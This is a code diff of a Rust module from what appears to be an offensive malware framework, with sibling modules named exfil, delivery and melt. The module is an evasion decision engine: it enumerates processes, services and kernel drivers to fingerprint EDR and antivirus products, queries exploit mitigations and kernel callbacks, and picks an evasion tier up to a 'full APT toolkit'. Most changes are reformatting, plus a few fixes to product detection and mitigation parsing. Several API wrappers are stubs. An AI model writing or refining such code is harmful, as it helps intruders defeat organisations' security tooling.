@@ -25,12 +25,10 @@ pub mod melt;
 
 pub mod delivery;
 
-use core::ffi::c_void;
 use crate::heap::Vec;
-pub mod exfil;
+use core::ffi::c_void;
 pub mod cleanup;
-
-
+pub mod exfil;
 
 // ---- Decision Engine ------------------------------------------------------
 
@@ -38,23 +36,29 @@ pub mod cleanup;
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum ThreatTier {
     /// No EDR/AV detected — user-mode evasion sufficient
-    Clean        = 0,
+    Clean = 0,
     /// Consumer AV only (Defender, Kaspersky, Norton) — byte-patch OK
-    ConsumerAV   = 1,
+    ConsumerAV = 1,
     /// Enterprise EDR detected (CrowdStrike, S1, Carbon Black) — HWBP blind needed
-    EnterpriseEDR= 2,
+    EnterpriseEDR = 2,
     /// Kernel callbacks active + minifilters — kernel evasion recommended
-    KernelArmed  = 3,
+    KernelArmed = 3,
     /// HVCI + CET + CFG strict — full APT toolkit required
-    Fortress     = 4,
+    Fortress = 4,
     /// Unknown / assessment failed — abort or fallback
-    Unknown      = 0xFF,
+    Unknown = 0xFF,
 }
 
 impl ThreatTier {
-    pub fn needs_hwbp(&self) -> bool { *self as u8 >= 2 }
-    pub fn needs_kernel(&self) -> bool { *self as u8 >= 3 }
-    pub fn needs_full_arsenal(&self) -> bool { *self as u8 >= 4 }
+    pub fn needs_hwbp(&self) -> bool {
+        *self as u8 >= 2
+    }
+    pub fn needs_kernel(&self) -> bool {
+        *self as u8 >= 3
+    }
+    pub fn needs_full_arsenal(&self) -> bool {
+        *self as u8 >= 4
+    }
 }
 
 /// Complete target assessment report.
@@ -128,13 +132,13 @@ pub struct MitigationFlags {
     pub cfg_strict: bool,
     pub cet_shadow_stack: bool,
     pub cet_strict: bool,
-    pub acg_enabled: bool,         // Arbitrary Code Guard
-    pub cig_enabled: bool,         // Code Integrity Guard
+    pub acg_enabled: bool, // Arbitrary Code Guard
+    pub cig_enabled: bool, // Code Integrity Guard
     pub dynamic_code_prohibited: bool,
-    pub signature_required: bool,  // Microsoft Signed Only
-    pub hvci_enabled: bool,        // Hypervisor Code Integrity
-    pub vbs_enabled: bool,         // Virtualization-Based Security
-    pub dma_guard_enabled: bool,   // Kernel DMA Protection
+    pub signature_required: bool, // Microsoft Signed Only
+    pub hvci_enabled: bool,       // Hypervisor Code Integrity
+    pub vbs_enabled: bool,        // Virtualization-Based Security
+    pub dma_guard_enabled: bool,  // Kernel DMA Protection
     pub secure_boot: bool,
 }
 
@@ -257,12 +261,16 @@ unsafe fn scan_processes(assessment: &mut TargetAssessment) {
     // Resolve CreateToolhelp32Snapshot + Process32FirstW/Process32NextW
     // Walk all processes, match against known EDR binary names
     let snapshot = create_toolhelp_snapshot();
-    if snapshot.is_null() { return; }
+    if snapshot.is_null() {
+        return;
+    }
 
     let mut pe = core::mem::zeroed::<ProcessEntry32W>();
     pe.dw_size = core::mem::size_of::<ProcessEntry32W>() as u32;
 
-    if process32_first(snapshot, &mut pe) == 0 { return; }
+    if process32_first(snapshot, &mut pe) == 0 {
+        return;
+    }
 
     loop {
         let name = wide_to_utf8(&pe.exe_file);
@@ -278,7 +286,9 @@ unsafe fn scan_processes(assessment: &mut TargetAssessment) {
             merge_or_push(&mut assessment.products, product);
         }
         pe.dw_size = core::mem::size_of::<ProcessEntry32W>() as u32;
-        if process32_next(snapshot, &mut pe) == 0 { break; }
+        if process32_next(snapshot, &mut pe) == 0 {
+            break;
+        }
     }
 
     close_handle(snapshot);
@@ -291,14 +301,18 @@ unsafe fn scan_service_registry(assessment: &mut TargetAssessment) {
     // Match ImagePath / DisplayName against known EDR patterns
     // No SCManager = no EDR telemetry
     let key = open_registry_key(b"SYSTEM\\CurrentControlSet\\Services");
-    if key.is_null() { return; }
+    if key.is_null() {
+        return;
+    }
 
     let mut index: u32 = 0;
     loop {
         let mut name_buf = [0u16; 256];
         let mut name_len = name_buf.len() as u32;
         let st = reg_enum_key(key, index, name_buf.as_mut_ptr(), &mut name_len);
-        if st != 0 { break; }
+        if st != 0 {
+            break;
+        }
 
         let subkey_name = wide_slice_to_utf8(&name_buf[..name_len as usize]);
         let subkey = open_registry_subkey(key, subkey_name);
@@ -311,7 +325,9 @@ unsafe fn scan_service_registry(assessment: &mut TargetAssessment) {
                     vendor,
                     product_name: vendor.default_name(),
                     detection_method: DetectionMethod::ServiceName,
-                    process_count: 0, driver_count: 0, service_count: 1,
+                    process_count: 0,
+                    driver_count: 0,
+                    service_count: 1,
                 };
                 merge_or_push(&mut assessment.products, product);
             }
@@ -341,7 +357,9 @@ unsafe fn scan_service_manager(assessment: &mut TargetAssessment) {
     // OpenSCManagerW + EnumServicesStatusExW
     // Match service display names + binary paths against EDR patterns
     let scm = open_sc_manager();
-    if scm.is_null() { return; }
+    if scm.is_null() {
+        return;
+    }
 
     let mut needed: u32 = 0;
     let mut returned: u32 = 0;
@@ -349,20 +367,38 @@ unsafe fn scan_service_manager(assessment: &mut TargetAssessment) {
 
     // First call: get buffer size
     enum_services_status_ex(
-        scm, 0, 0, // SC_ENUM_PROCESS_INFO
-        core::ptr::null_mut(), 0,
-        &mut needed, &mut returned, &mut resume, core::ptr::null(),
+        scm,
+        0,
+        0, // SC_ENUM_PROCESS_INFO
+        core::ptr::null_mut(),
+        0,
+        &mut needed,
+        &mut returned,
+        &mut resume,
+        core::ptr::null(),
     );
 
-    if needed == 0 { close_sc_manager(scm); return; }
+    if needed == 0 {
+        close_sc_manager(scm);
+        return;
+    }
 
     let buf = alloc(needed as usize);
-    if buf.is_null() { close_sc_manager(scm); return; }
+    if buf.is_null() {
+        close_sc_manager(scm);
+        return;
+    }
 
     if enum_services_status_ex(
-        scm, 0, 0,
-        buf, needed,
-        &mut needed, &mut returned, &mut resume, core::ptr::null(),
+        scm,
+        0,
+        0,
+        buf,
+        needed,
+        &mut needed,
+        &mut returned,
+        &mut resume,
+        core::ptr::null(),
     ) == 0
     {
         // Enumerate returned entries — match patterns
@@ -378,7 +414,9 @@ unsafe fn scan_service_manager(assessment: &mut TargetAssessment) {
                     vendor,
                     product_name: vendor.default_name(),
                     detection_method: DetectionMethod::ServiceName,
-                    process_count: 0, driver_count: 0, service_count: 1,
+                    process_count: 0,
+                    driver_count: 0,
+                    service_count: 1,
                 };
                 merge_or_push(&mut assessment.products, product);
             }
@@ -411,12 +449,23 @@ unsafe fn query_mitigations(flags: &mut MitigationFlags) {
 }
 
 fn query_cfg(flags: &mut MitigationFlags) {
-    #[repr(C)] struct CfgPolicy { flags: u32, _reserved: u32, strict_flags: u32, _pad: u32 }
-    let mut policy = CfgPolicy { flags: 0, _reserved: 0, strict_flags: 0, _pad: 0 };
+    #[repr(C)]
+    struct CfgPolicy {
+        flags: u32,
+        _reserved: u32,
+        strict_flags: u32,
+        _pad: u32,
+    }
+    let mut policy = CfgPolicy {
+        flags: 0,
+        _reserved: 0,
+        strict_flags: 0,
+        _pad: 0,
+    };
     let ok = unsafe {
         get_process_mitigation_policy(
             -1isize as isize, // GetCurrentProcess
-            8,                 // ProcessControlFlowGuardPolicy
+            8,                // ProcessControlFlowGuardPolicy
             &mut policy as *mut CfgPolicy as *mut core::ffi::c_void,
             core::mem::size_of::<CfgPolicy>() as u32,
         )
@@ -428,13 +477,20 @@ fn query_cfg(flags: &mut MitigationFlags) {
 }
 
 fn query_cet(flags: &mut MitigationFlags) {
-    #[repr(C)] struct CetPolicy {
-        flags: u32, _pad: u32,
-        strict_mode_flags: u32, _pad2: u32,
+    #[repr(C)]
+    struct CetPolicy {
+        flags: u32,
+        _pad: u32,
+        strict_mode_flags: u32,
+        _pad2: u32,
         _reserved: [u32; 8],
     }
     let mut policy = CetPolicy {
-        flags: 0, _pad: 0, strict_mode_flags: 0, _pad2: 0, _reserved: [0; 8],
+        flags: 0,
+        _pad: 0,
+        strict_mode_flags: 0,
+        _pad2: 0,
+        _reserved: [0; 8],
     };
     let ok = unsafe {
         get_process_mitigation_policy(
@@ -452,11 +508,19 @@ fn query_cet(flags: &mut MitigationFlags) {
 }
 
 fn query_dep(flags: &mut MitigationFlags) {
-    #[repr(C)] struct DepPolicy { flags: u32, _permanent: u32 }
-    let mut policy = DepPolicy { flags: 0, _permanent: 0 };
+    #[repr(C)]
+    struct DepPolicy {
+        flags: u32,
+        _permanent: u32,
+    }
+    let mut policy = DepPolicy {
+        flags: 0,
+        _permanent: 0,
+    };
     let ok = unsafe {
         get_process_mitigation_policy(
-            -1isize as isize, 1,
+            -1isize as isize,
+            1,
             &mut policy as *mut DepPolicy as *mut core::ffi::c_void,
             core::mem::size_of::<DepPolicy>() as u32,
         )
@@ -467,11 +531,15 @@ fn query_dep(flags: &mut MitigationFlags) {
 }
 
 fn query_aslr(flags: &mut MitigationFlags) {
-    #[repr(C)] struct AslrPolicy { flags: u32 }
+    #[repr(C)]
+    struct AslrPolicy {
+        flags: u32,
+    }
     let mut policy = AslrPolicy { flags: 0 };
     let ok = unsafe {
         get_process_mitigation_policy(
-            -1isize as isize, 2,
+            -1isize as isize,
+            2,
             &mut policy as *mut AslrPolicy as *mut core::ffi::c_void,
             core::mem::size_of::<AslrPolicy>() as u32,
         )
@@ -482,11 +550,15 @@ fn query_aslr(flags: &mut MitigationFlags) {
 }
 
 fn query_dynamic_code(flags: &mut MitigationFlags) {
-    #[repr(C)] struct DynCodePolicy { flags: u32 }
+    #[repr(C)]
+    struct DynCodePolicy {
+        flags: u32,
+    }
     let mut policy = DynCodePolicy { flags: 0 };
     let ok = unsafe {
         get_process_mitigation_policy(
-            -1isize as isize, 5,
+            -1isize as isize,
+            5,
             &mut policy as *mut DynCodePolicy as *mut core::ffi::c_void,
             core::mem::size_of::<DynCodePolicy>() as u32,
         )
@@ -497,11 +569,15 @@ fn query_dynamic_code(flags: &mut MitigationFlags) {
 }
 
 fn query_signature(flags: &mut MitigationFlags) {
-    #[repr(C)] struct SigPolicy { flags: u32 }
+    #[repr(C)]
+    struct SigPolicy {
+        flags: u32,
+    }
     let mut policy = SigPolicy { flags: 0 };
     let ok = unsafe {
         get_process_mitigation_policy(
-            -1isize as isize, 6,
+            -1isize as isize,
+            6,
             &mut policy as *mut SigPolicy as *mut core::ffi::c_void,
             core::mem::size_of::<SigPolicy>() as u32,
         )
@@ -511,19 +587,35 @@ fn query_signature(flags: &mut MitigationFlags) {
     }
 }
 
-fn query_image_load(flags: &mut MitigationFlags) {
-    #[repr(C)] struct ImgLoadPolicy { flags: u32, _pad1: u32, _pad2: u32, _pad3: u32 }
-    let mut policy = ImgLoadPolicy { flags: 0, _pad1: 0, _pad2: 0, _pad3: 0 };
+fn query_image_load(_flags: &mut MitigationFlags) {
+    #[repr(C)]
+    struct ImgLoadPolicy {
+        flags: u32,
+        _pad1: u32,
+        _pad2: u32,
+        _pad3: u32,
+    }
+    let mut policy = ImgLoadPolicy {
+        flags: 0,
+        _pad1: 0,
+        _pad2: 0,
+        _pad3: 0,
+    };
     let ok = unsafe {
         get_process_mitigation_policy(
-            -1isize as isize, 9,
+            -1isize as isize,
+            9,
             &mut policy as *mut ImgLoadPolicy as *mut core::ffi::c_void,
             core::mem::size_of::<ImgLoadPolicy>() as u32,
         )
     };
+    // ProcessImageLoadPolicy bits: NoLowLabel=0, NoRemote=1, NoUnsigned=2, PreferSystem32=3
+    // These are image-load restrictions, NOT ACG/CIG. ACG is ProcessDynamicCodePolicy (class 5),
+    // CIG is ProcessSignaturePolicy (class 6) — both queried separately above.
+    // There are no image-load-specific fields in MitigationFlags, so leave flags at defaults.
     if ok != 0 {
-        flags.acg_enabled = (policy.flags & (1 << 2)) != 0; // PreferSystem32Images
-        flags.cig_enabled = (policy.flags & (1 << 0)) != 0; // NoRemoteImages (CIG)
+        // Image-load restrictions (NoLowLabel/NoRemote/NoUnsigned/PreferSystem32) are not
+        // represented in MitigationFlags; intentionally no assignments here.
     }
 }
 
@@ -540,12 +632,16 @@ unsafe fn enumerate_kernel_modules(posture: &mut KernelPosture) {
     // NtQuerySystemInformation(SystemModuleInformation, class 11)
     // Maps module names → EDR driver patterns
     let buf = query_system_module_info();
-    if buf.is_null() { return; }
+    if buf.is_null() {
+        return;
+    }
 
     let modules = &*(buf as *const SystemModuleInfo);
     for i in 0..modules.count as usize {
-        let entry = &*((buf as usize + core::mem::size_of::<SystemModuleInfo>()
-            + i * core::mem::size_of::<SystemModuleEntry>()) as *const SystemModuleEntry);
+        let entry = &*((buf as usize
+            + core::mem::size_of::<SystemModuleInfo>()
+            + i * core::mem::size_of::<SystemModuleEntry>())
+            as *const SystemModuleEntry);
         let name = core::ffi::CStr::from_ptr(entry.name.as_ptr() as *const i8);
         let name_bytes = name.to_bytes();
 
@@ -562,20 +658,19 @@ unsafe fn query_code_integrity(posture: &mut KernelPosture) {
     // NtQuerySystemInformation(SystemCodeIntegrityInformation, class 103)
     // Flags: CODEINTEGRITY_OPTION_ENABLED, HVCI_KMCI_ENABLED, TESTSIGN
     let ci = query_system_code_integrity();
-    if ci.is_null() { return; }
+    if ci.is_null() {
+        return;
+    }
 
     let info = &*ci;
     let options = info.code_integrity_options;
 
-    posture.hvci_enabled = (options & (1 << 9)) != 0;   // HVCI_KMCI_ENABLED
-    posture.vbs_enabled = (options & (1 << 12)) != 0;    // VBS enabled (approximate)
+    posture.hvci_enabled = (options & (1 << 9)) != 0; // HVCI_KMCI_ENABLED
+    posture.vbs_enabled = (options & (1 << 12)) != 0; // VBS enabled (approximate)
     posture.test_signing_enabled = (options & (1 << 1)) != 0; // TESTSIGN
 }
 
-unsafe fn enumerate_process_callbacks(
-    rw: &dyn KernelReadWrite,
-    posture: &mut KernelPosture,
-) {
+unsafe fn enumerate_process_callbacks(rw: &dyn KernelReadWrite, posture: &mut KernelPosture) {
     // Locate PspCreateProcessNotifyRoutine via ntoskrnl.exe base + offset
     // Read 64-slot array, decode EX_CALLBACK pointers, map to drivers
     let ntos = match get_ntoskrnl_base() {
@@ -595,7 +690,9 @@ unsafe fn enumerate_process_callbacks(
             Some(e) => e,
             None => continue,
         };
-        if entry == 0 { continue; }
+        if entry == 0 {
+            continue;
+        }
 
         // EX_CALLBACK: clear low 4 bits (EX_RUNDOWN_REF flags)
         let callback = entry & !0xF;
@@ -605,10 +702,7 @@ unsafe fn enumerate_process_callbacks(
     }
 }
 
-unsafe fn enumerate_image_load_callbacks(
-    _rw: &dyn KernelReadWrite,
-    posture: &mut KernelPosture,
-) {
+unsafe fn enumerate_image_load_callbacks(_rw: &dyn KernelReadWrite, posture: &mut KernelPosture) {
     // PsSetLoadImageNotifyRoutine → PspLoadImageNotifyRoutine array
     // Same pattern as process callbacks but different symbol
     // PspLoadImageNotifyRoutine — typically near PspCreateProcessNotifyRoutine
@@ -622,10 +716,7 @@ unsafe fn enumerate_image_load_callbacks(
     posture.image_load_callbacks = 0; // requires per-build offset DB
 }
 
-unsafe fn enumerate_registry_callbacks(
-    _rw: &dyn KernelReadWrite,
-    posture: &mut KernelPosture,
-) {
+unsafe fn enumerate_registry_callbacks(_rw: &dyn KernelReadWrite, posture: &mut KernelPosture) {
     // CmRegisterCallback → CmpCallBackVector
     // Enumerate registry callbacks similarly
     posture.registry_callbacks = 0; // requires per-build offset DB
@@ -635,8 +726,8 @@ unsafe fn probe_etw_ti_provider(posture: &mut KernelPosture) {
     // GUID: F4E1897C-BB5D-5668-F1D8-040F4D8DD344
     // Query via NtTraceControl(EtwpNotificationRegistrar, ...)
     let guid: [u8; 16] = [
-        0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56,
-        0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44,
+        0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56, 0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3,
+        0x44,
     ];
     // NtTraceControl(control_code=0x0027, guid, enable_info)
     // If enable_info.IsEnabled != 0 → ETW-TI is active
@@ -647,17 +738,31 @@ unsafe fn probe_etw_ti_provider(posture: &mut KernelPosture) {
 
 fn determine_tier(assessment: &TargetAssessment) -> ThreatTier {
     let has_enterprise_edr = assessment.products.iter().any(|p| {
-        matches!(p.vendor,
-            Vendor::CrowdStrike | Vendor::SentinelOne | Vendor::MicrosoftDefenderATP |
-            Vendor::CarbonBlack | Vendor::ElasticEDR | Vendor::CortexXDR |
-            Vendor::Cybereason | Vendor::TrendMicroApex | Vendor::SophosInterceptX
+        matches!(
+            p.vendor,
+            Vendor::CrowdStrike
+                | Vendor::SentinelOne
+                | Vendor::MicrosoftDefenderATP
+                | Vendor::CarbonBlack
+                | Vendor::ElasticEDR
+                | Vendor::CortexXDR
+                | Vendor::Cybereason
+                | Vendor::TrendMicroApex
+                | Vendor::SophosInterceptX
         )
     });
     let has_av = assessment.products.iter().any(|p| {
-        matches!(p.vendor,
-            Vendor::Defender | Vendor::Kaspersky | Vendor::McAfee |
-            Vendor::Symantec | Vendor::ESET | Vendor::Bitdefender |
-            Vendor::Malwarebytes | Vendor::Avast | Vendor::Norton
+        matches!(
+            p.vendor,
+            Vendor::Defender
+                | Vendor::Kaspersky
+                | Vendor::McAfee
+                | Vendor::Symantec
+                | Vendor::ESET
+                | Vendor::Bitdefender
+                | Vendor::Malwarebytes
+                | Vendor::Avast
+                | Vendor::Norton
         )
     });
 
@@ -729,47 +834,121 @@ impl Vendor {
 fn match_process_name(name: &str) -> Option<Vendor> {
     let lower = name.to_lowercase();
     // Tier 1 EDR — 2026 process names
-    if lower.contains("csfalcon") || lower.contains("csagent") { return Some(Vendor::CrowdStrike); }
-    if lower.contains("sentinelagent") || lower.contains("sentinelone") { return Some(Vendor::SentinelOne); }
-    if lower.contains("mssense") || lower.contains("msmpeng") { return Some(Vendor::MicrosoftDefenderATP); }
-    if lower.contains("cbdefense") || lower.contains("cb.exe") || lower.contains("repmgr") { return Some(Vendor::CarbonBlack); }
-    if lower.contains("elastic-endpoint") || lower.contains("elastic-agent") { return Some(Vendor::ElasticEDR); }
-    if lower.contains("traps") || lower.contains("cyserver") || lower.contains("cytray") { return Some(Vendor::CortexXDR); }
-    if lower.contains("cybereason") || lower.contains("minionhost") { return Some(Vendor::Cybereason); }
-    if lower.contains("tmccsf") || lower.contains("ntrtscan") || lower.contains("pccntmon") { return Some(Vendor::TrendMicroApex); }
-    if lower.contains("sophos") || lower.contains("savservice") || lower.contains("hmpalert") { return Some(Vendor::SophosInterceptX); }
+    if lower.contains("csfalcon") || lower.contains("csagent") {
+        return Some(Vendor::CrowdStrike);
+    }
+    if lower.contains("sentinelagent") || lower.contains("sentinelone") {
+        return Some(Vendor::SentinelOne);
+    }
+    // MsSense runs only in Defender for Endpoint (ATP/EDR); MsMpEng runs in both
+    // consumer Defender and ATP. So MsSense → ATP, MsMpEng alone → Defender.
+    if lower.contains("mssense") {
+        return Some(Vendor::MicrosoftDefenderATP);
+    }
+    if lower.contains("cbdefense") || lower.contains("cb.exe") || lower.contains("repmgr") {
+        return Some(Vendor::CarbonBlack);
+    }
+    if lower.contains("elastic-endpoint") || lower.contains("elastic-agent") {
+        return Some(Vendor::ElasticEDR);
+    }
+    if lower.contains("traps") || lower.contains("cyserver") || lower.contains("cytray") {
+        return Some(Vendor::CortexXDR);
+    }
+    if lower.contains("cybereason") || lower.contains("minionhost") {
+        return Some(Vendor::Cybereason);
+    }
+    if lower.contains("tmccsf") || lower.contains("ntrtscan") || lower.contains("pccntmon") {
+        return Some(Vendor::TrendMicroApex);
+    }
+    if lower.contains("sophos") || lower.contains("savservice") || lower.contains("hmpalert") {
+        return Some(Vendor::SophosInterceptX);
+    }
     // Tier 2 AV
-    if lower.contains("msmpeng") && lower.contains("defender") { return Some(Vendor::Defender); }
-    if lower.contains("avp") || lower.contains("kavtray") || lower.contains("klnagent") { return Some(Vendor::Kaspersky); }
-    if lower.contains("mcshield") || lower.contains("mfefire") || lower.contains("mcafeefire") { return Some(Vendor::McAfee); }
-    if lower.contains("smc") || lower.contains("symcorp") || lower.contains("rtvscan") || lower.contains("ccsvchst") { return Some(Vendor::Symantec); }
-    if lower.contains("ekrn") || lower.contains("egui") { return Some(Vendor::ESET); }
-    if lower.contains("bdagent") || lower.contains("vsserv") { return Some(Vendor::Bitdefender); }
-    if lower.contains("mbamservice") || lower.contains("mbamtray") { return Some(Vendor::Malwarebytes); }
-    if lower.contains("avastsvc") || lower.contains("avastui") { return Some(Vendor::Avast); }
-    if lower.contains("nsbu") || lower.contains("navw32") { return Some(Vendor::Norton); }
+    if lower.contains("msmpeng") {
+        return Some(Vendor::Defender);
+    }
+    if lower.contains("avp") || lower.contains("kavtray") || lower.contains("klnagent") {
+        return Some(Vendor::Kaspersky);
+    }
+    if lower.contains("mcshield") || lower.contains("mfefire") || lower.contains("mcafeefire") {
+        return Some(Vendor::McAfee);
+    }
+    if lower.contains("smc")
+        || lower.contains("symcorp")
+        || lower.contains("rtvscan")
+        || lower.contains("ccsvchst")
+    {
+        return Some(Vendor::Symantec);
+    }
+    if lower.contains("ekrn") || lower.contains("egui") {
+        return Some(Vendor::ESET);
+    }
+    if lower.contains("bdagent") || lower.contains("vsserv") {
+        return Some(Vendor::Bitdefender);
+    }
+    if lower.contains("mbamservice") || lower.contains("mbamtray") {
+        return Some(Vendor::Malwarebytes);
+    }
+    if lower.contains("avastsvc") || lower.contains("avastui") {
+        return Some(Vendor::Avast);
+    }
+    if lower.contains("nsbu") || lower.contains("navw32") {
+        return Some(Vendor::Norton);
+    }
     // Infrastructure
-    if lower.contains("sysmon") { return Some(Vendor::Sysmon); }
-    if lower.contains("velociraptor") { return Some(Vendor::Velociraptor); }
-    if lower.contains("osqueryd") { return Some(Vendor::Osquery); }
-    if lower.contains("tanium") { return Some(Vendor::Tanium); }
+    if lower.contains("sysmon") {
+        return Some(Vendor::Sysmon);
+    }
+    if lower.contains("velociraptor") {
+        return Some(Vendor::Velociraptor);
+    }
+    if lower.contains("osqueryd") {
+        return Some(Vendor::Osquery);
+    }
+    if lower.contains("tanium") {
+        return Some(Vendor::Tanium);
+    }
     None
 }
 
 fn match_service_name(name: &str) -> Option<Vendor> {
     let lower = name.to_lowercase();
-    if lower.contains("csagent") || lower.contains("csfalcon") { return Some(Vendor::CrowdStrike); }
-    if lower.contains("sentinelagent") { return Some(Vendor::SentinelOne); }
-    if lower.contains("sense") || lower.contains("wdav") || lower.contains("windefend") { return Some(Vendor::MicrosoftDefenderATP); }
-    if lower.contains("cbdefense") || lower.contains("carbonblack") { return Some(Vendor::CarbonBlack); }
-    if lower.contains("elastic") && lower.contains("endpoint") { return Some(Vendor::ElasticEDR); }
-    if lower.contains("cybereason") { return Some(Vendor::Cybereason); }
-    if lower.contains("sophos") { return Some(Vendor::SophosInterceptX); }
-    if lower.contains("avp") || lower.contains("kaspersky") { return Some(Vendor::Kaspersky); }
-    if lower.contains("mcshield") || lower.contains("mcafee") { return Some(Vendor::McAfee); }
-    if lower.contains("symantec") || lower.contains("sep") { return Some(Vendor::Symantec); }
-    if lower.contains("ekrn") || lower.contains("eset") { return Some(Vendor::ESET); }
-    if lower.contains("bitdefender") || lower.contains("bdredline") { return Some(Vendor::Bitdefender); }
+    if lower.contains("csagent") || lower.contains("csfalcon") {
+        return Some(Vendor::CrowdStrike);
+    }
+    if lower.contains("sentinelagent") {
+        return Some(Vendor::SentinelOne);
+    }
+    if lower.contains("sense") || lower.contains("wdav") || lower.contains("windefend") {
+        return Some(Vendor::MicrosoftDefenderATP);
+    }
+    if lower.contains("cbdefense") || lower.contains("carbonblack") {
+        return Some(Vendor::CarbonBlack);
+    }
+    if lower.contains("elastic") && lower.contains("endpoint") {
+        return Some(Vendor::ElasticEDR);
+    }
+    if lower.contains("cybereason") {
+        return Some(Vendor::Cybereason);
+    }
+    if lower.contains("sophos") {
+        return Some(Vendor::SophosInterceptX);
+    }
+    if lower.contains("avp") || lower.contains("kaspersky") {
+        return Some(Vendor::Kaspersky);
+    }
+    if lower.contains("mcshield") || lower.contains("mcafee") {
+        return Some(Vendor::McAfee);
+    }
+    if lower.contains("symantec") || lower.contains("sep") {
+        return Some(Vendor::Symantec);
+    }
+    if lower.contains("ekrn") || lower.contains("eset") {
+        return Some(Vendor::ESET);
+    }
+    if lower.contains("bitdefender") || lower.contains("bdredline") {
+        return Some(Vendor::Bitdefender);
+    }
     None
 }
 
@@ -801,74 +980,154 @@ fn is_edr_driver(name: &[u8]) -> bool {
 type Handle = *mut core::ffi::c_void;
 type HKey = *mut core::ffi::c_void;
 
-unsafe fn create_toolhelp_snapshot() -> Handle { core::ptr::null_mut() }
-unsafe fn process32_first(_h: Handle, _pe: *mut ProcessEntry32W) -> i32 { 0 }
-unsafe fn process32_next(_h: Handle, _pe: *mut ProcessEntry32W) -> i32 { 0 }
+unsafe fn create_toolhelp_snapshot() -> Handle {
+    core::ptr::null_mut()
+}
+unsafe fn process32_first(_h: Handle, _pe: *mut ProcessEntry32W) -> i32 {
+    0
+}
+unsafe fn process32_next(_h: Handle, _pe: *mut ProcessEntry32W) -> i32 {
+    0
+}
 unsafe fn close_handle(_h: Handle) {}
 
-#[repr(C)] struct ProcessEntry32W {
-    dw_size: u32, _cnt_usage: u32, _th32_process_id: u32,
-    _th32_default_heap_id: usize, _th32_module_id: u32,
-    _cnt_threads: u32, _th32_parent_process_id: u32,
-    _pc_pri_class_base: i32, _dw_flags: u32,
+#[repr(C)]
+struct ProcessEntry32W {
+    dw_size: u32,
+    _cnt_usage: u32,
+    _th32_process_id: u32,
+    _th32_default_heap_id: usize,
+    _th32_module_id: u32,
+    _cnt_threads: u32,
+    _th32_parent_process_id: u32,
+    _pc_pri_class_base: i32,
+    _dw_flags: u32,
     exe_file: [u16; 260],
 }
 
-unsafe fn open_registry_key(_path: &[u8]) -> HKey { core::ptr::null_mut() }
-unsafe fn open_registry_subkey(_parent: HKey, _name: &str) -> HKey { core::ptr::null_mut() }
+unsafe fn open_registry_key(_path: &[u8]) -> HKey {
+    core::ptr::null_mut()
+}
+unsafe fn open_registry_subkey(_parent: HKey, _name: &str) -> HKey {
+    core::ptr::null_mut()
+}
 unsafe fn close_registry_key(_k: HKey) {}
-unsafe fn reg_enum_key(_k: HKey, _idx: u32, _name: *mut u16, _len: *mut u32) -> i32 { -1 }
-unsafe fn query_reg_value(_k: HKey, _name: &[u8]) -> &str { "" }
+unsafe fn reg_enum_key(_k: HKey, _idx: u32, _name: *mut u16, _len: *mut u32) -> i32 {
+    -1
+}
+unsafe fn query_reg_value(_k: HKey, _name: &[u8]) -> &str {
+    ""
+}
 
 unsafe fn wmi_query_av_products(_a: &mut TargetAssessment) {}
 unsafe fn wmi_query_services(_a: &mut TargetAssessment) {}
 unsafe fn wmi_query_drivers(_a: &mut TargetAssessment) {}
 
-unsafe fn open_sc_manager() -> Handle { core::ptr::null_mut() }
+unsafe fn open_sc_manager() -> Handle {
+    core::ptr::null_mut()
+}
 unsafe fn close_sc_manager(_h: Handle) {}
 
-#[repr(C)] struct EnumServiceStatusProcessW {
-    service_name: *const u16, display_name: *const u16,
+#[repr(C)]
+struct EnumServiceStatusProcessW {
+    service_name: *const u16,
+    display_name: *const u16,
     service_status: ServiceStatusProcess,
 }
-#[repr(C)] struct ServiceStatusProcess {
-    _typ: u32, _state: u32, _controls: u32,
-    _exit_code: u32, _svc_exit_code: u32, _check: u32, _wait: u32,
-    _pid: u32, _flags: u32,
+#[repr(C)]
+struct ServiceStatusProcess {
+    _typ: u32,
+    _state: u32,
+    _controls: u32,
+    _exit_code: u32,
+    _svc_exit_code: u32,
+    _check: u32,
+    _wait: u32,
+    _pid: u32,
+    _flags: u32,
 }
 
 unsafe fn enum_services_status_ex(
-    _scm: Handle, _level: u32, _typ: u32,
-    _buf: *mut u8, _buf_sz: u32,
-    _needed: *mut u32, _returned: *mut u32,
-    _resume: *mut u32, _group: *const u16,
-) -> i32 { 0 }
+    _scm: Handle,
+    _level: u32,
+    _typ: u32,
+    _buf: *mut u8,
+    _buf_sz: u32,
+    _needed: *mut u32,
+    _returned: *mut u32,
+    _resume: *mut u32,
+    _group: *const u16,
+) -> i32 {
+    0
+}
 
 unsafe fn wcslen(s: *const u16) -> usize {
     let mut n = 0;
-    while *s.add(n) != 0 { n += 1; }
+    while *s.add(n) != 0 {
+        n += 1;
+    }
     n
 }
 
-unsafe fn wide_slice_to_utf8(_w: &[u16]) -> &str { "" }
-unsafe fn wide_to_utf8(_w: &[u16]) -> &str { "" }
+unsafe fn wide_slice_to_utf8(_w: &[u16]) -> &str {
+    ""
+}
+unsafe fn wide_to_utf8(_w: &[u16]) -> &str {
+    ""
+}
 
 unsafe fn get_process_mitigation_policy(
-    _h: isize, _policy: u32, _buf: *mut core::ffi::c_void, _len: u32,
-) -> i32 { 0 }
+    _h: isize,
+    _policy: u32,
+    _buf: *mut core::ffi::c_void,
+    _len: u32,
+) -> i32 {
+    0
+}
 
-#[repr(C)] struct SystemModuleInfo { _reserved: u32, count: u32 }
-#[repr(C)] struct SystemModuleEntry { _section: usize, _flags: u32, base: usize, size: u32, _index: u16, _load_count: u16, _load_order_index: u16, _name_offset: u16, name: [u8; 256] }
+#[repr(C)]
+struct SystemModuleInfo {
+    _reserved: u32,
+    count: u32,
+}
+#[repr(C)]
+struct SystemModuleEntry {
+    _section: usize,
+    _flags: u32,
+    base: usize,
+    size: u32,
+    _index: u16,
+    _load_count: u16,
+    _load_order_index: u16,
+    _name_offset: u16,
+    name: [u8; 256],
+}
 
-unsafe fn query_system_module_info() -> *mut u8 { core::ptr::null_mut() }
-unsafe fn query_system_code_integrity() -> *mut CodeIntegrityInfo { core::ptr::null_mut() }
-unsafe fn get_ntoskrnl_base() -> Option<u64> { None }
